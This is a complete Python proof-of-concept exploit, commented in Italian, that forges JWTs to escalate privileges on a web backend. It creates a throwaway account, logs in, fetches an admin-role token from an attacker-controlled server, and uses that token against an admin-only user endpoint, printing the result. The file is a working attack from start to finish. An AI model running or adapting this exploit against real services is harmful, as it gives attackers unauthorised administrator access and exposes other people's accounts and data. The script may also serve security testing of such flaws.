#!/usr/bin/env python3
"""
Exploit PoC – JWT forgery / privilege escalation
richiede: pip install requests
"""

import json, random, string, argparse, sys
import requests
from urllib.parse import urljoin

def _rand(n=8): return ''.join(random.choice(string.ascii_letters) for _ in range(n))

# ───── fase 1 – registrazione utente base ─────
def signup(target):
    name  = f"user-{_rand(5)}"
    email = f"{name}@example.com"
    pwd   = _rand(12)
    r = requests.post(urljoin(target, "/api/signup"),
                      json={"name": name, "email": email,
                            "password": pwd, "cPassword": pwd},
                      timeout=10)
    r.raise_for_status()
    return email, pwd

# ───── fase 2 – login legittimo (role=0) ─────
def login(target, email, pwd):
    r = requests.post(urljoin(target, "/api/signin"),
                      json={"email": email, "password": pwd},
                      timeout=10)
    r.raise_for_status()
    data = r.json()                 # { token, user:{_id, role} }
    return data["token"], data["user"]["_id"]

# ───── fase 3 – token forgiato con ruolo admin ─────
def forge_token(attacker, uid):
    r = requests.post(urljoin(attacker, "/create-token"),
                      json={"_id": uid, "role": 1},
                      timeout=5)
    r.raise_for_status()
    return r.text.strip()

# ───── fase 4 – abusiamo della rotta /api/user protetta da isAdmin ─────
def abuse(target, forged, uid):
    r = requests.post(urljoin(target, "/api/user"),
                      headers={"Authorization": f"Bearer {forged}"},
                      json={"loggedInUserId": uid},
                      timeout=10)
    return r

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target",   default="http://localhost:8000",
                    help="URL backend vulnerabile")
    ap.add_argument("--attacker", default="http://localhost:3001",
                    help="URL dominio attacker")
    args = ap.parse_args()

    # 1-2. Creiamo utente legittimo
    email, pwd   = signup(args.target)
    legit, uid   = login(args.target, email, pwd)
    print(f"[+] Utente creato  id={uid} – email={email}")
    print(f"[+] JWT lecito   : {legit[:60]}…\n")

    # 3. Token malevolo
    forged = forge_token(args.attacker, uid)
    print(f"[+] JWT forgiato : {forged}\n")

    # 4. Privilege escalation
    resp = abuse(args.target, forged, uid)
    if resp.status_code == 200:
        print("[✓] Exploit riuscito – privilegi admin ottenuti!\n")
        print(json.dumps(resp.json(), indent=2))
    else:
        print(f"[✗] Exploit fallito – status {resp.status_code}\n{resp.text}")

if __name__ == "__main__":
    try:
        main()
    except requests.exceptions.RequestException as e:
        sys.exit(f"[ERR] {e}")
